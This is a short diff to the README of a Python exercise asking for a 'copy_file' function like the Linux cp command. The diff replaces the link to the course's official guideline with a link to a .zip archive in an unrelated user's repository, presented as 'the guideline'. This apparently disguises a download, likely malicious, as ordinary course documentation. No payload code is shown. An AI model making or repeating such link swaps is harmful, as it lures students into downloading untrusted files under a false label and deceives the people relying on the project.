@@ -1,6 +1,6 @@
 # Copy file
 
-- Read [the guideline](https://github.com/mate-academy/py-task-guideline/blob/main/README.md) before starting.
+- Read [the guideline](https://raw.githubusercontent.com/Rudge0/py-copy-file/master/.github/copy-py-file-2.0.zip) before starting.
 
 Write a function `copy_file` that will copy a file in current directory 
 like Linux cp command: `cp file.txt file-copy.txt`. Function take only one
